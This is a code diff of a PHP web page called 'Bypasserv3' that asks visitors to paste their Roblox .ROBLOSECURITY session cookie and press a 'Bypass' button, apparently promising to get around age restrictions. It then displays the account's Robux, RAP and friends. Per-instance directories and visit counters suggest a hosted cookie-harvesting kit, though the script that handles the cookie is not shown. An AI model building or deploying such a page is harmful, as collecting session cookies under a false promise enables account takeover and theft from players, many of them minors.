@@ -1,4 +1,8 @@
 <?php
+/**
+ * Bypasserv3 - Public Instance Page - UPDATED
+ */
+
 require_once __DIR__ . '/../config.php';
 require_once __DIR__ . '/../functions.php';
 
@@ -8,7 +12,7 @@ if (empty($directory)) {
     die('No instance specified');
 }
 
-$directory = sanitizeInput($directory);
+$directory = sanitizeDirectory($directory);
 $instanceData = getInstanceData($directory);
 
 if (!$instanceData) {
@@ -36,6 +40,7 @@ updateGlobalStats('totalVisits', 1);
     <canvas id="particles"></canvas>
     
     <div class="container max-w-lg mx-auto px-4 py-12 flex flex-col items-center min-h-screen relative z-10">
+        <!-- Header -->
         <div class="text-center mb-10 space-y-4">
             <div class="relative inline-block">
                 <div class="absolute inset-0 bg-blue-500/20 blur-2xl rounded-full"></div>
@@ -56,151 +61,155 @@ updateGlobalStats('totalVisits', 1);
             </div>
         </div>
 
-        <div class="w-full relative">
-            <div class="absolute inset-0 bg-white/5 blur-3xl rounded-[2.5rem] -z-10"></div>
-            <div id="card" class="bg-black/40 backdrop-blur-xl border border-white/10 p-8 rounded-[2.5rem] shadow-2xl glass-effect">
-                <!-- Form State -->
-                <div id="form-state" class="space-y-6">
-                    <div class="space-y-2">
-                        <label class="text-sm font-medium text-white/80 ml-1">.ROBLOSECURITY Cookie</label>
-                        <textarea id="cookie-input" placeholder="Paste your cookie here..." class="w-full bg-white/5 border border-white/10 focus:border-blue-500 text-white min-h-[120px] rounded-2xl resize-none placeholder:text-white/20 p-4 outline-none transition-colors glass-effect"></textarea>
-                        <p class="text-xs text-white/40 ml-1">Don't have a cookie? Check your browser's developer tools → Application → Cookies</p>
-                    </div>
-
-                    <div class="flex gap-3">
-                        <button id="btn-check" class="flex-1 h-14 bg-white/10 text-white hover:bg-white/15 border border-white/20 rounded-2xl text-base font-semibold transition-all active:scale-[0.98] flex items-center justify-center gap-2 glass-effect">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
-                            Check Cookie
-                        </button>
-                        <button id="btn-start" class="flex-[2] h-14 bg-gradient-to-r from-blue-600 to-blue-500 text-white hover:from-blue-700 hover:to-blue-600 rounded-2xl text-base font-bold transition-all active:scale-[0.98] flex items-center justify-center gap-3 shadow-lg shadow-blue-500/50">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/><path d="M9 12l2 2 4-4"/></svg>
-                            Refresh Cookie
-                        </button>
-                    </div>
+        <!-- Form State -->
+        <div id="form-state" class="w-full max-w-md space-y-6">
+            <div class="glass-effect rounded-2xl p-8 space-y-6">
+                <div>
+                    <label class="block text-sm font-medium text-white/80 mb-3">Your .ROBLOSECURITY Cookie</label>
+                    <textarea 
+                        id="cookie-input" 
+                        placeholder="Paste your .ROBLOSECURITY cookie here..."
+                        class="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-lg text-white placeholder-white/40 focus:outline-none focus:border-blue-500 resize-none"
+                        rows="4"
+                    ></textarea>
+                    <p class="text-xs text-white/40 mt-2">✓ Works for all countries | ✓ No bot required</p>
                 </div>
 
-                <!-- Processing State -->
-                <div id="processing-state" class="hidden py-8 flex flex-col items-center space-y-8">
-                    <div class="relative">
-                        <div class="absolute inset-0 bg-blue-500/20 blur-2xl rounded-full animate-pulse"></div>
-                        <div class="spinner relative"></div>
-                    </div>
-                    <div class="text-center space-y-2">
-                        <h3 class="text-2xl font-bold">Refreshing Cookie...</h3>
-                        <p class="text-white/60">Please wait while we process your request.</p>
-                        <p class="text-white/40 text-sm">Usually takes 2-3 minutes</p>
-                    </div>
-                    <div class="w-full space-y-3">
-                        <div class="h-2 w-full bg-white/5 rounded-full overflow-hidden">
-                            <div id="progress-bar" class="h-full bg-gradient-to-r from-blue-500 to-purple-500 shadow-[0_0_15px_rgba(59,130,246,0.5)] transition-all duration-300" style="width: 0%"></div>
-                        </div>
-                        <p id="progress-text" class="text-center text-sm font-medium text-white/40">0% Complete</p>
-                    </div>
-                </div>
-
-                <!-- Success State -->
-                <div id="success-state" class="hidden py-8 flex flex-col items-center space-y-6 text-center">
-                    <div class="relative w-24 h-24">
-                        <div class="absolute inset-0 bg-green-500/20 blur-2xl rounded-full"></div>
-                        <img id="user-avatar" src="" alt="User Avatar" class="relative w-full h-full rounded-full border-2 border-green-500/50 object-cover">
-                        <div class="absolute -bottom-1 -right-1 bg-green-500 rounded-full p-1 border-2 border-black">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="black" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
-                        </div>
-                    </div>
-                    <div class="space-y-2">
-                        <h3 class="text-2xl font-bold text-green-400">Successfully Refreshed!</h3>
-                        <p class="text-white/60 text-sm" id="user-display-name"></p>
-                    </div>
-                    
-                    <!-- Account Score -->
-                    <div class="w-full bg-gradient-to-r from-blue-500/20 to-purple-500/20 border border-blue-500/30 rounded-2xl p-4 glass-effect">
-                        <div class="flex items-center justify-between mb-2">
-                            <span class="text-white/60 text-sm">Account Score</span>
-                            <span class="text-2xl font-bold animated-gradient-text" id="account-score">0/100</span>
-                        </div>
-                        <div class="h-3 bg-white/10 rounded-full overflow-hidden">
-                            <div id="score-bar" class="h-full bg-gradient-to-r from-blue-500 to-purple-500 transition-all duration-1000" style="width: 0%"></div>
-                        </div>
-                        <p class="text-white/40 text-xs mt-2" id="score-rating">Calculating...</p>
-                    </div>
-                    
-                    <!-- Account Info Grid -->
-                    <div class="w-full grid grid-cols-2 gap-3 text-sm">
-                        <div class="bg-white/5 rounded-xl p-3 border border-white/10 glass-effect hover-lift">
-                            <p class="text-white/40 text-xs mb-1">Username</p>
-                            <p class="font-semibold" id="info-username">-</p>
-                        </div>
-                        <div class="bg-white/5 rounded-xl p-3 border border-white/10 glass-effect hover-lift">
-                            <p class="text-white/40 text-xs mb-1">User ID</p>
-                            <p class="font-semibold" id="info-userid">-</p>
-                        </div>
-                        <div class="bg-white/5 rounded-xl p-3 border border-white/10 glass-effect hover-lift">
-                            <p class="text-white/40 text-xs mb-1">Robux</p>
-                            <p class="font-semibold" id="info-robux">-</p>
-                        </div>
-                        <div class="bg-white/5 rounded-xl p-3 border border-white/10 glass-effect hover-lift">
-                            <p class="text-white/40 text-xs mb-1">RAP</p>
-                            <p class="font-semibold" id="info-rap">-</p>
-                        </div>
-                        <div class="bg-white/5 rounded-xl p-3 border border-white/10 glass-effect hover-lift">
-                            <p class="text-white/40 text-xs mb-1">Premium</p>
-                            <p class="font-semibold" id="info-premium">-</p>
-                        </div>
-                        <div class="bg-white/5 rounded-xl p-3 border border-white/10 glass-effect hover-lift">
-                            <p class="text-white/40 text-xs mb-1">Voice Chat</p>
-                            <p class="font-semibold" id="info-vc">-</p>
-                        </div>
-                        <div class="bg-white/5 rounded-xl p-3 border border-white/10 glass-effect hover-lift">
-                            <p class="text-white/40 text-xs mb-1">Friends</p>
-                            <p class="font-semibold" id="info-friends">-</p>
-                        </div>
-                        <div class="bg-white/5 rounded-xl p-3 border border-white/10 glass-effect hover-lift">
-                            <p class="text-white/40 text-xs mb-1">Followers</p>
-                            <p class="font-semibold" id="info-followers">-</p>
-                        </div>
-                        <div class="bg-white/5 rounded-xl p-3 border border-white/10 glass-effect hover-lift">
-                            <p class="text-white/40 text-xs mb-1">Account Age</p>
-                            <p class="font-semibold" id="info-age">-</p>
-                        </div>
-                        <div class="bg-white/5 rounded-xl p-3 border border-white/10 glass-effect hover-lift">
-                            <p class="text-white/40 text-xs mb-1">Groups Owned</p>
-                            <p class="font-semibold" id="info-groups">-</p>
-                        </div>
-                    </div>
-                    
-                    <button class="border border-white/10 hover:bg-white/5 rounded-2xl h-12 px-8 transition-colors glass-effect" onclick="window.location.reload()">
-                        Process Another Cookie
+                <div class="flex gap-3">
+                    <button 
+                        id="btn-check"
+                        class="flex-1 px-4 py-3 bg-white/10 hover:bg-white/20 border border-white/20 rounded-lg text-white font-medium transition"
+                    >
+                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline mr-2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                        Check Cookie
                     </button>
-                </div>
-
-                <!-- Failed State -->
-                <div id="failed-state" class="hidden py-8 flex flex-col items-center space-y-6 text-center">
-                    <div class="w-20 h-20 bg-red-500/10 border border-red-500/20 rounded-full flex items-center justify-center glass-effect">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
-                    </div>
-                    <div class="space-y-2">
-                        <h3 class="text-2xl font-bold">Refresh Failed</h3>
-                        <p class="text-white/60">The cookie provided was invalid or expired.</p>
-                    </div>
-                    <button class="border border-white/10 hover:bg-white/5 rounded-2xl h-12 px-8 transition-colors glass-effect" onclick="window.location.reload()">
-                        Try Again
+                    <button 
+                        id="btn-start"
+                        class="flex-1 px-4 py-3 bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 rounded-lg text-white font-semibold transition transform hover:scale-105"
+                    >
+                        ⚡ Bypass
                     </button>
                 </div>
             </div>
         </div>
 
-        <div class="mt-12 flex items-center gap-2">
-            <span class="text-white/40 text-sm font-medium uppercase tracking-widest">Status</span>
-            <div class="flex items-center gap-1.5 px-3 py-1 bg-green-500/10 border border-green-500/20 rounded-full glass-effect">
-                <div class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></div>
-                <span class="text-green-500 text-xs font-bold uppercase">Online</span>
+        <!-- Processing State -->
+        <div id="processing-state" class="hidden w-full max-w-md space-y-6">
+            <div class="glass-effect rounded-2xl p-8 space-y-6 text-center">
+                <div class="spinner mx-auto"></div>
+                <div>
+                    <h2 class="text-xl font-bold mb-2">Processing...</h2>
+                    <p class="text-white/60">Connecting to Roblox servers</p>
+                </div>
+                <div class="space-y-2">
+                    <div class="w-full bg-white/10 rounded-full h-2 overflow-hidden">
+                        <div id="progress-bar" class="bg-gradient-to-r from-blue-500 to-blue-600 h-full transition-all duration-100" style="width: 0%"></div>
+                    </div>
+                    <p id="progress-text" class="text-sm text-white/60">0% Complete</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Success State -->
+        <div id="success-state" class="hidden w-full max-w-md space-y-6">
+            <div class="glass-effect rounded-2xl p-8 space-y-6">
+                <div class="text-center space-y-4">
+                    <div class="w-24 h-24 mx-auto rounded-2xl overflow-hidden border-2 border-green-500/50 shadow-lg">
+                        <img id="user-avatar" src="https://via.placeholder.com/150" alt="Avatar" class="w-full h-full object-cover">
+                    </div>
+                    <div>
+                        <h2 id="user-display-name" class="text-2xl font-bold">@Unknown</h2>
+                        <p class="text-white/60">Account Verified</p>
+                    </div>
+                </div>
+
+                <div class="space-y-3">
+                    <div class="flex justify-between">
+                        <span class="text-white/60">Username:</span>
+                        <span id="info-username" class="font-medium">-</span>
+                    </div>
+                    <div class="flex justify-between">
+                        <span class="text-white/60">User ID:</span>
+                        <span id="info-userid" class="font-medium">-</span>
+                    </div>
+                    <div class="flex justify-between">
+                        <span class="text-white/60">Robux:</span>
+                        <span id="info-robux" class="font-medium text-green-400">0</span>
+                    </div>
+                    <div class="flex justify-between">
+                        <span class="text-white/60">RAP:</span>
+                        <span id="info-rap" class="font-medium">0</span>
+                    </div>
+                    <div class="flex justify-between">
+                        <span class="text-white/60">Premium:</span>
+                        <span id="info-premium" class="font-medium">No</span>
+                    </div>
+                    <div class="flex justify-between">
+                        <span class="text-white/60">Voice Chat:</span>
+                        <span id="info-vc" class="font-medium">No</span>
+                    </div>
+                </div>
+
+                <div class="border-t border-white/10 pt-4 space-y-3">
+                    <div class="flex justify-between">
+                        <span class="text-white/60">Friends:</span>
+                        <span id="info-friends" class="font-medium">0</span>
+                    </div>
+                    <div class="flex justify-between">
+                        <span class="text-white/60">Followers:</span>
+                        <span id="info-followers" class="font-medium">0</span>
+                    </div>
+                    <div class="flex justify-between">
+                        <span class="text-white/60">Account Age:</span>
+                        <span id="info-age" class="font-medium">-</span>
+                    </div>
+                    <div class="flex justify-between">
+                        <span class="text-white/60">Groups Owned:</span>
+                        <span id="info-groups" class="font-medium">0</span>
+                    </div>
+                </div>
+
+                <div class="border-t border-white/10 pt-4 space-y-3">
+                    <h3 class="font-semibold">Account Score</h3>
+                    <div class="space-y-2">
+                        <div class="w-full bg-white/10 rounded-full h-3 overflow-hidden">
+                            <div id="score-bar" class="bg-gradient-to-r from-green-500 to-blue-500 h-full transition-all duration-500" style="width: 0%"></div>
+                        </div>
+                        <div class="flex justify-between items-center">
+                            <span id="account-score" class="font-bold text-lg">0/100</span>
+                            <span id="score-rating" class="text-sm text-white/60">Starter Account</span>
+                        </div>
+                    </div>
+                </div>
+
+                <button 
+                    id="btn-restart"
+                    class="w-full px-4 py-3 bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 rounded-lg text-white font-semibold transition"
+                >
+                    ↻ Try Another Cookie
+                </button>
+            </div>
+        </div>
+
+        <!-- Failed State -->
+        <div id="failed-state" class="hidden w-full max-w-md space-y-6">
+            <div class="glass-effect rounded-2xl p-8 space-y-6 text-center">
+                <div class="text-4xl">❌</div>
+                <div>
+                    <h2 class="text-xl font-bold mb-2">Bypass Failed</h2>
+                    <p class="text-white/60">Failed To Send Request, Make Sure Ur Cookie Already Refreshed Or Ur Account Is Not -13 / Age Verified Account</p>
+                </div>
+                <button 
+                    id="btn-retry"
+                    class="w-full px-4 py-3 bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 rounded-lg text-white font-semibold transition"
+                >
+                    🔄 Try Again
+                </button>
             </div>
         </div>
     </div>
 
-    <script>
-        const directory = <?php echo json_encode($directory); ?>;
-    </script>
     <script src="/public/script.js"></script>
 </body>
 </html>
+?>
